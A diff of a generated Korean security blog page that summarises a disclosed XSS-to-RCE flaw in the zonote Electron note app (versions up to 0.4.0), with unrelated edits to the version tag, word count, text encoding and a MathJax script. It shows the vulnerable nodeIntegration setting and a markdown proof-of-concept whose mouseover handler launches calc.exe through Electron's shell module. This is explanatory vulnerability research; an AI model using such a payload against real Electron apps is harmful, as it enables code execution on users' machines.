@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      168 자
+      262 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        분
     </span>
   
@@ -242,33 +242,33 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>문서 작성 Electron App인 zonote에서 RCE 취약점이 공개되었습니다. zonote 문서에 마크다운과 html을 삽입해 XSS(Cross-Site-Script) 공격을 할 수 있는데 악용 범위를 RCE까지 확장할 수 있습니다. </p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBB38;&#xC11C; &#xC791;&#xC131; Electron App&#xC778; zonote&#xC5D0;&#xC11C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. zonote &#xBB38;&#xC11C;&#xC5D0; &#xB9C8;&#xD06C;&#xB2E4;&#xC6B4;&#xACFC; html&#xC744; &#xC0BD;&#xC785;&#xD574; XSS(Cross-Site-Script) &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xB370; &#xC545;&#xC6A9; &#xBC94;&#xC704;&#xB97C; RCE&#xAE4C;&#xC9C0; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <blockquote>
 <p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p>
 </blockquote>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron의 공식문서</a>에 따르면 원격 콘텐츠에 접근하는 모든 renderer는 Node.js intergration이 비활성화되어있어야 합니다. XSS 취약점이 존재해도 그 악용 범위를 renderer 내부로 제한하기 위해 Electron 5.0.0부터 권장해온 기본 설정입니다. </p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron&#xC758; &#xACF5;&#xC2DD;&#xBB38;&#xC11C;</a>&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC6D0;&#xACA9; &#xCF58;&#xD150;&#xCE20;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xBAA8;&#xB4E0; renderer&#xB294; Node.js intergration&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. XSS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD574;&#xB3C4; &#xADF8; &#xC545;&#xC6A9; &#xBC94;&#xC704;&#xB97C; renderer &#xB0B4;&#xBD80;&#xB85C; &#xC81C;&#xD55C;&#xD558;&#xAE30; &#xC704;&#xD574; Electron 5.0.0&#xBD80;&#xD130; &#xAD8C;&#xC7A5;&#xD574;&#xC628; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. </p>
 <ul>
-<li>다음은 zonote의 main.js코드 일부입니다.</li>
+<li>&#xB2E4;&#xC74C;&#xC740; zonote&#xC758; main.js&#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</li>
 </ul>
-<pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;
+<pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = {
     ...
-    webPreference: &#123;
+    webPreference: {
         nodeIntergration : <span class="hljs-literal">true</span>,
         enableRemoteModule : <span class="hljs-literal">true</span>
-    &#125;
-&#125;</code></pre>
+    }
+}</code></pre>
 
-<p>Node.js intergration이 활성화되어있으므로 XSS를 통한 RCE 취약점이 존재합니다.</p>
+<p>Node.js intergration&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBBC0;&#xB85C; XSS&#xB97C; &#xD1B5;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li>PoC</li>
 </ul>
 <pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span>
-<span class="xml">try&#123;</span>
-<span class="xml">	const &#123;shell&#125; = require(&#x27;electron&#x27;);</span>
-<span class="xml">	shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span>
-<span class="xml">&#125;catch(e)&#123;</span>
+<span class="xml">try{</span>
+<span class="xml">	const {shell} = require(&apos;electron&apos;);</span>
+<span class="xml">	shell.openExternal(&apos;file:C:/Windows/System32/calc.exe&apos;)</span>
+<span class="xml">}catch(e){</span>
 <span class="xml">	console.error(e)</span>
-<span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>
+<span class="xml">}&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>
 
 
 
@@ -572,6 +572,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
